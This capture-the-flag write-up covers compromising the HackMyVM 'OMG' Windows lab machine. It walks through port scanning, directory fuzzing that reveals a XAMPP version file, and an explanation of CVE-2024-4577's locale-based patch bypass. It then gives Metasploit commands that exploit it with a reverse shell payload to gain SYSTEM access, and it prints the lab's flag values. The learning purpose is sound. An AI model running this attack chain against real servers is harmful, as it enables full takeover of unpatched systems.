# OMG — HackMyVM Writeup

**Platform:** HackMyVM  
**OS:** Windows  
**Difficulty:** Easy  
**Author:** Shalopai  
**Techniques:** Web Enumeration, CVE-2024-4577 (PHP CGI Argument Injection RCE)

---

## Summary

OMG is an Easy-rated Windows machine running XAMPP with a vulnerable version of PHP CGI. After discovering the XAMPP version through directory fuzzing, we identify the machine is running PHP 8.2.12 with a Japanese locale — a configuration known to be vulnerable to CVE-2024-4577. Exploiting this vulnerability via Metasploit grants us a reverse shell directly as `nt authority\system`, giving us full access without any privilege escalation needed.

---

## Reconnaissance

### Network Discovery

```bash
sudo netdiscover -r 172.20.10.0/24
```

Target identified at `172.20.10.2`.

Added to `/etc/hosts`:
```
172.20.10.2  omg.hmv
```

### Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 -Pn 172.20.10.2
```

**Key results:**

| Port | Service | Details |
|------|---------|---------|
| 80   | HTTP    | Apache httpd |
| 443  | HTTPS   | Apache httpd |
| 445  | SMB     | Microsoft-DS |
| 5985 | WinRM   | Microsoft HTTPAPI 2.0 |
| 135, 139 | MSRPC | Windows RPC |

Notable findings:
- Windows machine (`Service Info: OS: Windows`)
- SMB signing enabled but not required
- WinRM available on 5985 (useful for post-exploitation)
- Apache web server redirects to `/dashboard/` — XAMPP installation

---

## Enumeration

### Web Application — Directory Fuzzing

Visiting `http://172.20.10.2` redirects to `/dashboard/` — a default XAMPP welcome page. 

Directory fuzzing revealed a `/xampp` endpoint:

```bash
ffuf -u http://172.20.10.2/FUZZ \
  -w /home/shalopai/Desktop/directory-list-lowercase-2.3-medium.txt
```

**Results:**
```
xampp     [Status: 301]
dashboard [Status: 301]
img       [Status: 301]
```

### XAMPP Version Discovery

With the `/xampp` directory found, a second fuzzing pass using `quickhits.txt` — a wordlist specifically designed to find common sensitive files — was run against it:

```bash
ffuf -u http://172.20.10.2/xampp/FUZZ \
  -w /home/shalopai/Desktop/quickhits.txt
```

**Results:**
```
.version  [Status: 200, Size: 20]
```

Reading the file:

```bash
curl http://172.20.10.2/xampp/.version
```

```
8.2.12
LAN=日本語
```

**Critical finding:** XAMPP version 8.2.12 with `LAN=日本語` (Japanese locale).

### Why the Japanese Locale Matters

CVE-2024-4577 is a PHP CGI argument injection vulnerability that affects PHP on Windows. What makes this particular configuration vulnerable is the **Japanese locale setting**.

In Japanese Windows, a "Best-Fit" character encoding feature maps certain Unicode characters to ASCII equivalents. Specifically, the soft hyphen character (`0xAD`) gets mapped to a regular hyphen (`-`). PHP CGI uses hyphens as argument separators, meaning an attacker can inject PHP arguments through specially crafted URL parameters.

This bypass was discovered because the original CVE-2012-1823 patch only filtered certain characters — but didn't account for the Windows character encoding "Best-Fit" behaviour in CJK (Chinese/Japanese/Korean) locales.

**In short:** Japanese locale → character encoding quirk → patch bypass → RCE.

---

## Exploitation — CVE-2024-4577

### Metasploit

```bash
msfconsole
```

```
msf > use exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577
msf exploit(...) > set payload php/reverse_php
msf exploit(...) > set RHOST 172.20.10.2
msf exploit(...) > run
```

**Why `php/reverse_php` payload?**

Among the available payloads, `php/reverse_php` was selected because it:
- Establishes a **reverse connection** back to the attacker (required since the target is behind NAT)
- Drops into a **command shell** directly, without requiring a staged meterpreter
- Is compatible with PHP CGI execution context on Windows

**Result:**

```
[+] The target is vulnerable. Apache
[*] Command shell session opened (172.20.10.5:4444 -> 172.20.10.2:49723)
```

### Shell Access

> **Note:** This is a Windows CMD shell, not Linux bash. Use `dir` instead of `ls`, and `type` instead of `cat`.

```
whoami
nt authority\system
```

We land directly as `nt authority\system` — the highest privilege level on Windows, equivalent to root. No privilege escalation required.

**Why SYSTEM directly?**

XAMPP by default runs the Apache/PHP process under the `SYSTEM` account. Since we're exploiting PHP CGI which is executed by Apache, we inherit those privileges — giving us immediate full control of the machine.

---

## Alternative: Meterpreter Shell

Instead of `php/reverse_php`, using the default `php/meterpreter/reverse_tcp` payload gives a full Meterpreter session which is more stable and feature-rich:

```
msf exploit(...) > run
[*] Meterpreter session 1 opened
```

**Why Meterpreter is better than a raw shell on Windows:**

Meterpreter runs entirely in memory and provides its own cross-platform command set — `ls`, `cat`, `cd`, `download`, `upload` — all work regardless of the underlying OS. With a raw CMD shell, you're limited to Windows-native commands (`dir`, `type`) and the session can be unstable.

One quirk: `cd C:\Users\Administrator\Desktop` with backslashes failed with `Operation failed: 1`. Navigate step by step instead:

```
meterpreter > cd C:\Users
meterpreter > cd Administrator
meterpreter > cd Desktop
meterpreter > ls
```

---

## Flags

```
cd C:\Users\Administrator\Desktop
dir
```

```
12/02/2025  root.txt
12/02/2025  user.txt
```

```
type user.txt
4dcd00d9b6c66a0eae4a30aa0c781406

type root.txt
af70e9322a562983e01a250ca84fe28d
```

---

## Lessons Learned

- **Always check `.version` and similar metadata files** — they expose exact software versions which map directly to known CVEs.
- **Default configurations are dangerous.** XAMPP ships with Japanese locale on Japanese Windows, and running Apache as SYSTEM — both are default settings that combine to create a critical vulnerability.
- **Windows shell ≠ Linux shell.** On a Windows reverse shell, Linux commands like `ls`, `cat`, `pwd` don't work. Use `dir`, `type`, `cd` instead.
- **CVE-2024-4577 is a patch bypass**, not a new class of vulnerability. Understanding *why* the patch failed (Best-Fit encoding) is more valuable than just knowing the CVE number.

---

*Machine: OMG | Platform: HackMyVM | Writeup by Shalopai*